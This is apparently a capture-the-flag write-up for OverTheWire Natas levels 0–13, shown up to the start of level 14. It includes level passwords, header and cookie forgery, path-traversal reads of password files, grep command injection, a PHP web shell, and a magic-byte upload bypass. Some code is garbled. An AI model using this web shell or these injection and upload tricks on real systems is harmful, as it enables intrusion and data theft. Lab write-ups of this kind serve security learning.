+<a href=https://gohugo.io/>Hugo</a></p></section></div></nav><section id=body><div id=overlay></div><div class="padding highlightable"><div><div id=top-bar><div id=breadcrumbs itemscope itemtype=http://data-vocabulary.org/Breadcrumb><span id=sidebar-toggle-span><a href=# id=sidebar-toggle data-sidebar-toggle><i class="fas fa-bars"></i></a></span><span id=toc-menu><i class="fas fa-list-alt"></i></span><span class=links><a href=/></a>> <a href=/notes/>Notes</a> > <a href=/notes/ctfs/>CTFs</a> > <a href=/notes/ctfs/overthewire/>OverTheWire</a> > Natasa</span></div><div class=progress><div class=wrapper><nav id=TableOfContents><ul><li><a href=#natasa>natasa</a><ul><li><a href=#natas0>Natas0</a></li><li><a href=#natas1>Natas1</a></li><li><a href=#natas2>Natas2</a></li><li><a href=#natas-3>natas 3</a></li><li><a href=#natas-4>Natas 4</a></li><li><a href=#natas-5>Natas 5</a></li><li><a href=#natas-6>natas 6</a></li><li><a href=#natas-7>Natas 7</a></li><li><a href=#natas-8>Natas 8</a></li><li><a href=#natas-9>natas 9</a></li><li><a href=#natas10>natas10</a></li><li><a href=#natas11>natas11</a></li><li><a href=#natas12>natas12</a></li><li><a href=#natas13>natas13</a></li><li><a href=#natas-14>Natas 14</a></li><li><a href=#natas15>Natas15</a></li><li><a href=#natas16>Natas16</a></li><li><a href=#natas17>Natas17</a></li><li><a href=#natas18>Natas18</a></li><li><a href=#natas19>Natas19</a></li><li><a href=#natas21>natas21</a></li><li><a href=#natas22>natas22</a></li><li><a href=#natas23>natas23</a></li><li><a href=#natas24>natas24</a></li><li><a href=#natas25>natas25</a></li><li><a href=#natas26>natas26</a></li><li><a href=#natas27>natas27</a></li></ul></li></ul></nav></div></div></div></div><div id=head-tags><div class=tags><a class=tag-link href=/tags/overthewire>OverTheWire</a></div></div><div id=body-inner><h2 id=natasa>natasa</h2><h3 id=natas0>Natas0</h3><pre><code class=language-text>view-source:http://natas0.natas.labs.overthewire.org/
+the password for natas1 is gtVrDuiDfck831PqWsLEZy5gyDz1clto
+</code></pre><h3 id=natas1>Natas1</h3><pre><code class=language-text>view-source:http://natas1.natas.labs.overthewire.org/
+the password for natas2 is ZluruAthQk7Q2MqmDeTiUij2ZvWy2mBi
+</code></pre><h3 id=natas2>Natas2</h3><pre><code class=language-text>view-source:http://natas2.natas.labs.overthewire.org/files/pixel.png
+http://natas2.natas.labs.overthewire.org/files/
+http://natas2.natas.labs.overthewire.org/files/users.txt
+
+# username:password
+alice:BYNdCesZqW
+bob:jw2ueICLvT
+charlie:G5vCxkVV3m
+natas3:sJIJNW6ucpu6HPZ1ZAchaDtwd7oGrD14
+eve:zo4mJWyNj2
+mallory:9urtcpzBmH
+</code></pre><h3 id=natas-3>natas 3</h3><pre><code class=language-text>http://natas3.natas.labs.overthewire.org/robots.txt
+http://natas3.natas.labs.overthewire.org/s3cr3t/
+http://natas3.natas.labs.overthewire.org/s3cr3t/users.txt
+natas4:Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ
+</code></pre><h3 id=natas-4>Natas 4</h3><p>Access disallowed. You are visiting from "&rdquo; while authorized users should come only from &ldquo;<a href=http://natas5.natas.labs.overthewire.org/>http://natas5.natas.labs.overthewire.org/</a>&rdquo;</p><pre><code class=language-text>F12 -&gt; network -&gt; reload page -&gt;  edit headers
+Add following
+Referer: http://natas5.natas.labs.overthewire.org/
+
+resend
+Access granted. The password for natas5 is iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq
+</code></pre><h3 id=natas-5>Natas 5</h3><p>Access disallowed. You are not logged in</p><pre><code class=language-text>F12 -&gt; network -&gt; load page -&gt; look at cookie header.
+Cookie: __cfduid=d95a9db8b02c419d414e69605e6cd5dc81557856656; loggedin=0
+
+Change loggedin=0 to loggedin=1
+resend
+
+Access granted. The password for natas6 is aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1
+</code></pre><h3 id=natas-6>natas 6</h3><pre><code class=language-text>Click on view source code.
+This gives us 1 script
+</code></pre><pre><code class=language-php>include &quot;includes/secret.inc&quot;;
+
+    if(array_key_exists(&quot;submit&quot;, $_POST)) {
+        if($secret == $_POST['secret']) {
+        print &quot;Access granted. The password for natas7 is &lt;censored&gt;&quot;;
+    } else {
+        print &quot;Wrong secret&quot;;
+    }
+    }
+?&gt;
+</code></pre><pre><code class=language-text>If POST = $Secret -&gt; Access granted.
+Where is secrect ?
+Look at include
+view-source:http://natas6.natas.labs.overthewire.org/includes/secret.inc
+</code></pre><pre><code class=language-php>&lt;?
+$secret = &quot;FOEIUWGHFEEUHOFUOIU&quot;;
+?&gt;
+</code></pre><pre><code class=language-text>Access granted. The password for natas7 is 7z3hEENjQtflzgnT29q7wAvMNfZdh0i9
+</code></pre><h3 id=natas-7>Natas 7</h3><pre><code class=language-text>View source
+hint: password for webuser natas8 is in /etc/natas_webpass/natas8
+</code></pre><pre><code class=language-markup>&lt;a href=&quot;index.php?page=home&quot;&gt;Home&lt;/a&gt;
+&lt;a href=&quot;index.php?page=about&quot;&gt;About&lt;/a&gt;
+</code></pre><p>HREFs look vulnerable to LFI</p><pre><code class=language-text>http://natas7.natas.labs.overthewire.org/index.php?page=../../../../../../../../../../../../../../../../../../../../../../../../../../../etc/natas_webpass/natas8
+</code></pre><p>DBfUBfqQG69KvJvJ1iAbMoIpwSNQ9bWe</p><h3 id=natas-8>Natas 8</h3><p>click view source</p><pre><code class=language-php>&lt;?
+
+$encodedSecret = &quot;3d3d516343746d4d6d6c315669563362&quot;;
+
+function encodeSecret($secret) {
+    return bin2hex(strrev(base64_encode($secret)));
+}
+
+if(array_key_exists(&quot;submit&quot;, $_POST)) {
+    if(encodeSecret($_POST['secret']) == $encodedSecret) {
+    print &quot;Access granted. The password for natas9 is &lt;censored&gt;&quot;;
+    } else {
+    print &quot;Wrong secret&quot;;
+    }
+}
+?&gt;
+</code></pre><p>A string has been encoded with the function encodeSecret.</p><p>base64_encode — Encodes data with MIME base64<br><a href=https://www.php.net/base64_encode>https://www.php.net/base64_encode</a></p><p>strrev — Reverse a string<br><a href=https://www.php.net/manual/en/function.strrev.php>https://www.php.net/manual/en/function.strrev.php</a></p><p>bin2hex — Convert binary data into hexadecimal representation<br><a href=https://www.php.net/manual/en/function.bin2hex.php>https://www.php.net/manual/en/function.bin2hex.php</a></p><p>We need to create a decodeSecret function. Lets find commands to reverse the encoding.</p><p>base64_decode<br><a href=https://www.php.net/manual/en/function.base64-decode.php>https://www.php.net/manual/en/function.base64-decode.php</a></p><p>string reverse<br><a href=https://www.php.net/manual/en/function.strrev.php>https://www.php.net/manual/en/function.strrev.php</a></p><p>hex2bin<br><a href=https://www.php.net/manual/en/function.hex2bin.php>https://www.php.net/manual/en/function.hex2bin.php</a></p><pre><code class=language-php>$encodedSecret = &quot;3d3d516343746d4d6d6c315669563362&quot;;
+
+function dencodeSecret($secret) {
+    return base64_decode(strrev(hex2bin($secret)));
+}
+
+echo dencodeSecret($encodedSecret);
+
+[Running] php &quot;c:\_git\github\tempCodeRunnerFile.php&quot;
+oubWYf2kBq
+[Done] exited with code=0 in 0.154 seconds
+</code></pre><pre><code class=language-text>Access granted. The password for natas9 is W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl
+</code></pre><h3 id=natas-9>natas 9</h3><p>view source</p><pre><code class=language-php>$key = &quot;&quot;;
+
+if(array_key_exists(&quot;needle&quot;, $_REQUEST)) {
+    $key = $_REQUEST[&quot;needle&quot;];
+}
+
+if($key != &quot;&quot;) {
+    passthru(&quot;grep -i $key dictionary.txt&quot;);
+}
+</code></pre><p>No input validation. We can do command injection. lets just add a additional file to grep and search for something that is likely to be in the password.</p><pre><code class=language-text>1 /etc/natas_webpass/natas10
+</code></pre><pre><code class=language-text>Output:
+
+/etc/natas_webpass/natas10:nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu
+</code></pre><h3 id=natas10>natas10</h3><p>view source</p><pre><code class=language-php>$key = &quot;&quot;;
+
+if(array_key_exists(&quot;needle&quot;, $_REQUEST)) {
+    $key = $_REQUEST[&quot;needle&quot;];
+}
+
+if($key != &quot;&quot;) {
+    if(preg_match('/[;|&amp;]/',$key)) {
+        print &quot;Input contains an illegal character!&quot;;
+    } else {
+        passthru(&quot;grep -i $key dictionary.txt&quot;);
+    }
+}
+</code></pre><p>now there is some input validation to avoid things like ; | and &, but our trick from natas09 still works here.</p><pre><code class=language-text>1 /etc/natas_webpass/natas11
+</code></pre><pre><code class=language-text>Output:
+
+/etc/natas_webpass/natas11:U82q5TCMMQ9xuFoI3dYX61s7OZD9JKoK
+</code></pre><h3 id=natas11>natas11</h3><p>Cookies are protected with XOR encryption</p><p>view source</p><pre><code class=language-php>$defaultdata = array( &quot;showpassword&quot;=&gt;&quot;no&quot;, &quot;bgcolor&quot;=&gt;&quot;#ffffff&quot;);
+
+function xor_encrypt($in) {
+    $key = '&lt;censored&gt;';
+    $text = $in;
+    $outText = '';
+1 /etc/natas_webpass/natas11
+    // Iterate through eac1 /etc/natas_webpass/natas11h character
+    for($i=0;$i&lt;strlen($text);$i++) {
+    $outText .= $text[$i] ^ $key[$i % strlen($key)];
+    }
+
+    return $outText;
+}
+
+function loadData($def) {
+    global $_COOKIE;
+    $mydata = $def;
+    if(array_key_exists(&quot;data&quot;, $_COOKIE)) {
+    $tempdata = json_decode(xor_encrypt(base64_decode($_COOKIE[&quot;data&quot;])), true);
+    if(is_array($tempdata) &amp;&amp; array_key_exists(&quot;showpassword&quot;, $tempdata) &amp;&amp; array_key_exists(&quot;bgcolor&quot;, $tempdata)) {
+        if (preg_match('/^#(?:[a-f\d]{6})$/i', $tempdata['bgcolor'])) {
+        $mydata['showpassword'] = $tempdata['showpassword'];
+        $mydata['bgcolor'] = $tempdata['bgcolor'];
+        }
+    }
+    }
+    return $mydata;
+}
+
+function saveData($d) {
+    setcookie(&quot;data&quot;, base64_encode(xor_encrypt(json_encode($d))));
+}
+
+$data = loadData($defaultdata);
+
+if(array_key_exists(&quot;bgcolor&quot;,$_REQUEST)) {
+    if (preg_match('/^#(?:[a-f\d]{6})$/i', $_REQUEST['bgcolor'])) {
+        $data['bgcolor'] = $_REQUEST['bgcolor'];
+    }
+}
+
+saveData($data);
+
+
+&lt;?
+if($data[&quot;showpassword&quot;] == &quot;yes&quot;) {
+    print &quot;The password for natas12 is &lt;censored&gt;&lt;br&gt;&quot;;
+}
+
+?&gt;
+</code></pre><p>Set-Cookie</p><pre><code class=language-text>data=ClVLIh4ASCsCBE8lAxMacFMZV2hdVVotEhhUJQNVAmhSEV4sFxFeaAw%3D
+</code></pre><p>Cookie</p><pre><code class=language-text>__cfduid=dc2e23c92b1d237ff6fcd21eeaace26841568619071; __utma=176859643.1037695426.1568619071.1568619071.1568619071.1; __utmb=176859643.2.10.1568619071; __utmc=176859643; __utmz=176859643.1568619071.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none); __utmt=1; data=ClVLIh4ASCsCBE8lAxMacFMZV2hdVVotEhhUJQNVAmhSEV4sFxFeaAw%3D
+</code></pre><pre><code class=language-text>#ffffff
+ClVLIh4ASCsCBE8lAxMacFMZV2hdVVotEhhUJQNVAmhSEV4sFxFeaAw=
+</code></pre><pre><code class=language-text>#131516
+ClVLIh4ASCsCBE8lAxMacFMZV2hdVVotEhhUJQNVAmhSRgt7REYOaAw=
+</code></pre><pre><code class=language-text>#141617
+ClVLIh4ASCsCBE8lAxMacFMZV2hdVVotEhhUJQNVAmhSRgx7R0YPaAw=
+</code></pre><p>It seems the color code is in the cookie.</p><p>Lets reuse the PHP code given to us and update it.</p><pre><code class=language-php>function xor_t_k($intext,$inkey) {
+    $key = $inkey;
+    $text = $intext;
+    $outText = '';
+
+    // Iterate through each character
+    for($i=0;$i&lt;strlen($text);$i++) {
+    $outText .= $text[$i] ^ $key[$i % strlen($key)];
+    }
+
+    return $outText;
+}
+
+$defaultdata = array( &quot;showpassword&quot;=&gt;&quot;no&quot;, &quot;bgcolor&quot;=&gt;&quot;#ffffff&quot;);
+
+$JsonData = json_encode($defaultdata);
+$_COOKIE = array(&quot;__cfduid&quot; =&gt; &quot;dc2e23c92b1d237ff6fcd21eeaace26841568619071&quot;,
+&quot;__utma&quot; =&gt; &quot;176859643.1037695426.1568619071.1568619071.1568619071.1&quot;,
+&quot;__utmb&quot; =&gt; &quot;176859643.2.10.1568619071; __utmc=176859643&quot;,
+&quot;__utmz&quot; =&gt; &quot;176859643.1568619071.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none)&quot;,
+&quot;utmt&quot; =&gt; &quot;1&quot;,
+&quot;data&quot; =&gt; &quot;ClVLIh4ASCsCBE8lAxMacFMZV2hdVVotEhhUJQNVAmhSEV4sFxFeaAw=&quot;
+);
+$basedecoded = base64_decode($_COOKIE[&quot;data&quot;]);
+# print $basedecoded;
+# print $JsonData;
+$XOR_Key = xor_t_k($JsonData, $basedecoded);
+print $XOR_Key;
+</code></pre><pre><code class=language-text>[Running] php &quot;/home/justin-p/tempCodeRunnerFile.php&quot;
+qw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jq
+[Done] exited with code=0 in 0.022 seconds
+</code></pre><pre><code class=language-php>function xor_encrypt($in) {
+    $key = 'qw8J';
+    $text = $in;
+    $outText = '';
+
+    // Iterate through each character
+    for($i=0;$i&lt;strlen($text);$i++) {
+    $outText .= $text[$i] ^ $key[$i % strlen($key)];
+    }
+
+    return $outText;
+}
+$_COOKIE = array(&quot;__cfduid&quot; =&gt; &quot;dc2e23c92b1d237ff6fcd21eeaace26841568619071&quot;,
+&quot;__utma&quot; =&gt; &quot;176859643.1037695426.1568619071.1568619071.1568619071.1&quot;,
+&quot;__utmb&quot; =&gt; &quot;176859643.2.10.1568619071; __utmc=176859643&quot;,
+&quot;__utmz&quot; =&gt; &quot;176859643.1568619071.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none)&quot;,
+&quot;utmt&quot; =&gt; &quot;1&quot;,
+&quot;data&quot; =&gt; &quot;ClVLIh4ASCsCBE8lAxMacFMZV2hdVVotEhhUJQNVAmhSEV4sFxFeaAw=&quot;
+);
+$tempdata = json_decode(xor_encrypt(base64_decode($_COOKIE[&quot;data&quot;])), true);
+print print_r($tempdata, true);
+</code></pre><pre><code class=language-text>[Running] php &quot;/home/justin-p/tempCodeRunnerFile.php&quot;
+Array
+(
+    [showpassword] =&gt; no
+    [bgcolor] =&gt; #ffffff
+)
+
+[Done] exited with code=0 in 0.021 seconds
+</code></pre><pre><code class=language-php>function xor_encrypt($in) {
+    $key = 'qw8J';
+    $text = $in;
+    $outText = '';
+
+    // Iterate through each character
+    for($i=0;$i&lt;strlen($text);$i++) {
+    $outText .= $text[$i] ^ $key[$i % strlen($key)];
+    }
+
+    return $outText;
+}
+$pass_yes = array( &quot;showpassword&quot;=&gt;&quot;yes&quot;, &quot;bgcolor&quot;=&gt;&quot;#ffffff&quot;);
+$json_pass_yes = json_encode($pass_yes);
+#print $json_pass_yes;
+$xor_pass_yes = xor_encrypt($json_pass_yes);
+#print $xor_pass_yes;
+$base_pass_yes = base64_encode($xor_pass_yes);
+print $base_pass_yes;
+</code></pre><pre><code class=language-text>[Running] php &quot;/home/justin-p/tempCodeRunnerFile.php&quot;
+ClVLIh4ASCsCBE8lAxMacFMOXTlTWxooFhRXJh4FGnBTVF4sFxFeLFMK
+[Done] exited with code=0 in 0.018 seconds
+</code></pre><pre><code class=language-php>function xor_encrypt($in) {
+    $key = 'qw8J';
+    $text = $in;
+    $outText = '';
+
+    // Iterate through each character
+    for($i=0;$i&lt;strlen($text);$i++) {
+    $outText .= $text[$i] ^ $key[$i % strlen($key)];
+    }
+
+    return $outText;
+}
+$pass_yes = array( &quot;showpassword&quot;=&gt;&quot;yes&quot;, &quot;bgcolor&quot;=&gt;&quot;#ffffff&quot;);
+$json_pass_yes = json_encode($pass_yes);
+#print $json_pass_yes;
+$xor_pass_yes = xor_encrypt($json_pass_yes);
+#print $xor_pass_yes;
+$base_pass_yes = base64_encode($xor_pass_yes);
+$_COOKIE = elserray(&quot;__cfduid&quot; =&gt; &quot;dc2e23c92b1d237ff6fcd21eeaace26841568619071&quot;,
+&quot;__utma&quot; =&gt;else&quot;176859643.1037695426.1568619071.1568619071.1568619071.1&quot;,
+&quot;__utmb&quot; =&gt; &quot;176859643.2.10.1568619071; __utmc=176859643&quot;,
+&quot;__utmz&quot; =&gt; &quot;176859643.1568619071.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none)&quot;,
+&quot;utmt&quot; =&gt; &quot;1&quot;,
+&quot;data&quot; =&gt; &quot;$base_pass_yes&quot;
+);
+
+$defaultdata = array( &quot;showpassword&quot;=&gt;&quot;no&quot;, &quot;bgcolor&quot;=&gt;&quot;#ffffff&quot;);
+function loadData($def) {
+    global $_COOKIE;
+    $mydata = $def;
+    if(array_key_exists(&quot;data&quot;, $_COOKIE)) {
+    $tempdata = json_decode(xor_encrypt(base64_decode($_COOKIE[&quot;data&quot;])), true);
+    if(is_array($tempdata) &amp;&amp; array_key_exists(&quot;showpassword&quot;, $tempdata) &amp;&amp; array_key_exists(&quot;bgcolor&quot;, $tempdata)) {
+        if (preg_match('/^#(?:[a-f\d]{6})$/i', $tempdata['bgcolor'])) {
+        $mydata['showpassword'] = $tempdata['showpassword'];
+        $mydata['bgcolor'] = $tempdata['bgcolor'];
+        }
+    }
+    }
+    return $mydata;
+}
+
+$data = loadData($defaultdata);
+if($data[&quot;showpassword&quot;] == &quot;yes&quot;) {
+    print &quot;The password for natas12 is &lt;censored&gt;&lt;br&gt;&quot;;
+}
+</code></pre><p>[Running] php &ldquo;/home/justin-p/tempCodeRunnerFile.php&rdquo; The password for natas12 is<br>[Done] exited with code=0 in 0.02 seconds</p><pre><code class=language-javascript>document.cookie =
+  &quot;data=ClVLIh4ASCsCBE8lAxMacFMOXTlTWxooFhRXJh4FGnBTVF4sFxFeLFMK&quot;;
+</code></pre><p>or use burp</p><pre><code class=language-text>The password for natas12 is EDXp0pS26wLKHZy1rDBPUZk0RKfLGIR3
+</code></pre><pre><code class=language-php>function xor_encrypt($in) {
+    $key = base64_decode(&quot;ClVLIh4ASCsCBE8lAxMacFMZV2hdVVotEhhUJQNVAmhSEV4sFxFeaAw&quot;);
+    $text = $in;
+    $outText = '';
+
+    // Iterate through each character
+    for($i=0;$i&lt;strlen($text);$i++) {
+    $outText .= $text[$i] ^ $key[$i % strlen($key)];
+    }
+
+    return $outText;
+}
+
+echo xor_encrypt(json_encode(array( &quot;showpassword&quot;=&gt;&quot;no&quot;, &quot;bgcolor&quot;=&gt;&quot;#ffffff&quot;)));
+
+function xor_encrypt($in) {
+    $key = 'qw8J';
+    $text = $in;
+    $outText = '';
+
+    // Iterate through each character
+    for($i=0;$i&lt;strlen($text);$i++) {
+    $outText .= $text[$i] ^ $key[$i % strlen($key)];
+    }
+
+    return $outText;
+}
+
+echo base64_encode(xor_encrypt(json_encode(array( &quot;showpassword&quot;=&gt;&quot;yes&quot;, &quot;bgcolor&quot;=&gt;&quot;#ffffff&quot;))));
+</code></pre><h3 id=natas12>natas12</h3><pre><code class=language-markup>&lt;?
+
+function genRandomString() {
+    $length = 10;
+    $characters = &quot;0123456789abcdefghijklmnopqrstuvwxyz&quot;;
+    $string = &quot;&quot;;
+
+    for ($p = 0; $p &lt; $length; $p++) {
+        $string .= $characters[mt_rand(0, strlen($characters)-1)];
+    }
+
+    return $string;
+}
+
+function makeRandomPath($dir, $ext) {
+    do {
+    $path = $dir.&quot;/&quot;.genRandomString().&quot;.&quot;.$ext;
+    } while(file_exists($path));
+    return $path;
+}
+
+function makeRandomPathFromFilename($dir, $fn) {
+    $ext = pathinfo($fn, PATHINFO_EXTENSION);
+    return makeRandomPath($dir, $ext);
+}
+
+if(array_key_exists(&quot;filename&quot;, $_POST)) {
+    $target_path = makeRandomPathFromFilename(&quot;upload&quot;, $_POST[&quot;filename&quot;]);
+
+
+        if(filesize($_FILES['uploadedfile']['tmp_name']) &gt; 1000) {
+        echo &quot;File is too big&quot;;
+    } else {
+        if(move_uploaded_file($_FILES['uploadedfile']['tmp_name'], $target_path)) {
+            echo &quot;The file &lt;a href=\&quot;$target_path\&quot;&gt;$target_path&lt;/a&gt; has been uploaded&quot;;
+        } else{
+            echo &quot;There was an error uploading the file, please try again!&quot;;
+        }
+    }
+} else {
+?&gt;
+
+&lt;form enctype=&quot;multipart/form-data&quot; action=&quot;index.php&quot; method=&quot;POST&quot;&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;MAX_FILE_SIZE&quot; value=&quot;1000&quot; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;filename&quot; value=&quot;&lt;? print genRandomString(); ?&gt;.jpg&quot; /&gt;
+Choose a JPEG to upload (max 1KB):&lt;br/&gt;
+&lt;input name=&quot;uploadedfile&quot; type=&quot;file&quot; /&gt;&lt;br /&gt;
+&lt;input type=&quot;submit&quot; value=&quot;Upload File&quot; /&gt;
+&lt;/form&gt;
+&lt;? } ?&gt;
+&lt;div id=&quot;viewsource&quot;&gt;&lt;a href=&quot;index-source.html&quot;&gt;View sourcecode&lt;/a&gt;&lt;/div&gt;
+&lt;/div&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+</code></pre><p>No filetype valiation.<br>Simple PHP shell</p><pre><code class=language-php>&lt;!-- By justin-p (https://raw.githubusercontent.com/justin-p/sec-stuff/master/php/simple_shell/simple_shell.php) based of https://github.com/artyuum/Simple-PHP-Web-Shell/ --&gt;
+&lt;?php if (empty($_POST['cmd'])) {$cmd = &quot;&quot;;} elseif (!empty($_POST['cmd'])) {$cmd = shell_exec($_POST['cmd']);} ?&gt;
+&lt;form method=&quot;POST&quot;&gt;&lt;input type=&quot;text&quot; style=&quot;width:100%;height:25px;&quot; name=&quot;cmd&quot; id=&quot;cmd&quot; value=&quot;&lt;?php if (!empty($_POST['cmd'])) {htmlspecialchars($_POST['cmd'], ENT_QUOTES, 'UTF-8');} ?&gt;&quot; required&gt;&lt;button type=&quot;submit&quot; class=&quot;btn btn-primary&quot;&gt;Execute&lt;/button&gt;&lt;/form&gt;
+&lt;?php if (!$cmd &amp;&amp; $_SERVER['REQUEST_METHOD'] != 'POST'): ?&gt;&lt;small&gt;Enter command.&lt;/small&gt; &lt;?php elseif ($cmd): ?&gt;&lt;pre&gt;&lt;?= htmlspecialchars($cmd, ENT_QUOTES, 'UTF-8') ?&gt;&lt;/pre&gt; &lt;?php elseif (!$cmd &amp;&amp; $_SERVER['REQUEST_METHOD'] == 'POST'): ?&gt;&lt;small&gt;No results.&lt;/small&gt; &lt;?php endif; ?&gt;
+</code></pre><p>Now we just need to update the file name</p><pre><code class=language-text>&lt;input type=&quot;hidden&quot; name=&quot;filename&quot; value=&quot;&lt;? print genRandomString(); ?&gt;.jpg&quot; /&gt;
+</code></pre><p>to</p><pre><code class=language-text>&lt;input type=&quot;hidden&quot; name=&quot;filename&quot; value=&quot;&lt;? print genRandomString(); ?&gt;.php&quot; /&gt;
+</code></pre><p>We can do this with Burp or F12 -> network -> headers -> edit and resend</p><pre><code class=language-text>Content-Disposition: form-data; name=&quot;filename&quot;
+
+zpfrokehzg.php
+</code></pre><pre><code class=language-text>The file upload/zpfrokehzg.php has been uploaded
+</code></pre><p>From here we can simply use the shell to cat the file</p><pre><code class=language-text>jmLTY0qiPZBbaKc9341cqPQZBJv7MQbY
+</code></pre><h3 id=natas13>natas13</h3><pre><code class=language-markup>&lt;html&gt;
+&lt;head&gt;
+&lt;!-- This stuff in the header has nothing to do with the level --&gt;
+&lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;http://natas.labs.overthewire.org/css/level.css&quot;&gt;
+&lt;link rel=&quot;stylesheet&quot; href=&quot;http://natas.labs.overthewire.org/css/jquery-ui.css&quot; /&gt;
+&lt;link rel=&quot;stylesheet&quot; href=&quot;http://natas.labs.overthewire.org/css/wechall.css&quot; /&gt;
+&lt;script src=&quot;http://natas.labs.overthewire.org/js/jquery-1.9.1.js&quot;&gt;&lt;/script&gt;
+&lt;script src=&quot;http://natas.labs.overthewire.org/js/jquery-ui.js&quot;&gt;&lt;/script&gt;
+&lt;script src=http://natas.labs.overthewire.org/js/wechall-data.js&gt;&lt;/script&gt;&lt;script src=&quot;http://natas.labs.overthewire.org/js/wechall.js&quot;&gt;&lt;/script&gt;
+&lt;script&gt;var wechallinfo = { &quot;level&quot;: &quot;natas13&quot;, &quot;pass&quot;: &quot;&lt;censored&gt;&quot; };&lt;/script&gt;&lt;/head&gt;
+&lt;body&gt;
+&lt;h1&gt;natas13&lt;/h1&gt;
+&lt;div id=&quot;content&quot;&gt;
+For security reasons, we now only accept image files!&lt;br/&gt;&lt;br/&gt;
+
+&lt;?
+
+function genRandomString() {
+    $length = 10;
+    $characters = &quot;0123456789abcdefghijklmnopqrstuvwxyz&quot;;
+    $string = &quot;&quot;;
+
+    for ($p = 0; $p &lt; $length; $p++) {
+        $string .= $characters[mt_rand(0, strlen($characters)-1)];
+    }
+
+    return $string;
+}
+
+function makeRandomPath($dir, $ext) {
+    do {
+    $path = $dir.&quot;/&quot;.genRandomString().&quot;.&quot;.$ext;
+    } while(file_exists($path));
+    return $path;
+}
+
+function makeRandomPathFromFilename($dir, $fn) {
+    $ext = pathinfo($fn, PATHINFO_EXTENSION);
+    return makeRandomPath($dir, $ext);
+}
+
+if(array_key_exists(&quot;filename&quot;, $_POST)) {
+    $target_path = makeRandomPathFromFilename(&quot;upload&quot;, $_POST[&quot;filename&quot;]);
+
+    $err=$_FILES['uploadedfile']['error'];
+    if($err){
+        if($err === 2){
+            echo &quot;The uploaded file exceeds MAX_FILE_SIZE&quot;;
+        } else{
+            echo &quot;Something went wrong :/&quot;;
+        }
+    } else if(filesize($_FILES['uploadedfile']['tmp_name']) &gt; 1000) {
+        echo &quot;File is too big&quot;;
+    } else if (! exif_imagetype($_FILES['uploadedfile']['tmp_name'])) {
+        echo &quot;File is not an image&quot;;
+    } else {
+        if(move_uploaded_file($_FILES['uploadedfile']['tmp_name'], $target_path)) {
+            echo &quot;The file &lt;a href=\&quot;$target_path\&quot;&gt;$target_path&lt;/a&gt; has been uploaded&quot;;
+        } else{
+            echo &quot;There was an error uploading the file, please try again!&quot;;
+        }
+    }
+} else {
+?&gt;
+
+&lt;form enctype=&quot;multipart/form-data&quot; action=&quot;index.php&quot; method=&quot;POST&quot;&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;MAX_FILE_SIZE&quot; value=&quot;1000&quot; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;filename&quot; value=&quot;&lt;? print genRandomString(); ?&gt;.jpg&quot; /&gt;
+Choose a JPEG to upload (max 1KB):&lt;br/&gt;
+&lt;input name=&quot;uploadedfile&quot; type=&quot;file&quot; /&gt;&lt;br /&gt;
+&lt;input type=&quot;submit&quot; value=&quot;Upload File&quot; /&gt;
+&lt;/form&gt;
+&lt;? } ?&gt;
+&lt;div id=&quot;viewsource&quot;&gt;&lt;a href=&quot;index-source.html&quot;&gt;View sourcecode&lt;/a&gt;&lt;/div&gt;
+&lt;/div&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+</code></pre><p>exif_imagetype checks the first bytes of the &lsquo;image&rsquo; and verify its a image.<br>These first bytes are also called the &lsquo;magic number&rsquo; or &lsquo;magic bytes&rsquo;.</p><p>If we change the first bytes of our file to match a image file, lets say jpg, exif_imagetype will lets it pass. FF D8 FF DB is the JPEG magic number<br><a href=https://www.wikiwand.com/en/List_of_file_signatures>https://www.wikiwand.com/en/List_of_file_signatures</a></p><p>I used hexdump for VSCode <a href="https://marketplace.visualstudio.com/items?itemName=slevesque.vscode-hexdump">https://marketplace.visualstudio.com/items?itemName=slevesque.vscode-hexdump</a></p><pre><code class=language-text>Offset:   00 01 02 03 04 05 06 07 08 09 0A 0B 0C 0D 0E 0F
+00000000: FF D8 FF DB 3C 21 2D 2D 20 42 79 20 6A 75 73 74    .X.[&lt;!--.By.just
+00000010: 69 6E 2D 70 20 28 68 74 74 70 73 3A 2F 2F 72 61    in-p.(https://ra
+</code></pre><p>Python could also be used to add the magic bytes.</p><pre><code class=language-python>fh = open('p_shell.php', 'w')
+fh.write('\xFF\xD8\xFF\xE0' + '&lt;?php if (empty($_POST[\'cmd\'])) {$cmd = &quot;&quot;;} elseif (!empty($_POST[\'cmd\'])) {$cmd = shell_exec($_POST[\'cmd\']);} ?&gt;&lt;form method=&quot;POST&quot;&gt;&lt;input type=&quot;text&quot; style=&quot;width:100%;height:25px;&quot; name=&quot;cmd&quot; id=&quot;cmd&quot; value=&quot;&lt;?php if (!empty($_POST[\'cmd\'])) {htmlspecialchars($_POST[\'cmd\'], ENT_QUOTES, \'UTF-8\');} ?&gt;&quot; required&gt;&lt;button type=&quot;submit&quot; class=&quot;btn btn-primary&quot;&gt;Execute&lt;/button&gt;&lt;/form&gt;&lt;?php if (!$cmd &amp;&amp; $_SERVER[\'REQUEST_METHOD\'] != \'POST\'): ?&gt;&lt;small&gt;Enter command.&lt;/small&gt; &lt;?php elseif ($cmd): ?&gt;&lt;pre&gt;&lt;?= htmlspecialchars($cmd, ENT_QUOTES, \'UTF-8\') ?&gt;&lt;/pre&gt; &lt;?php elseif (!$cmd &amp;&amp; $_SERVER[\'REQUEST_METHOD\'] == \'POST\'): ?&gt;&lt;small&gt;No results.&lt;/small&gt; &lt;?php endif; ?&gt;')
+fh.close()
+</code></pre><p>Upload the file and cat the password file<br>Lg96M10TdfaPyVBkJdjymbllQ5L6qdl1</p><h3 id=natas-14>Natas 14</h3><pre><code class=language-markup>&lt;html&gt;
+&lt;head&gt;
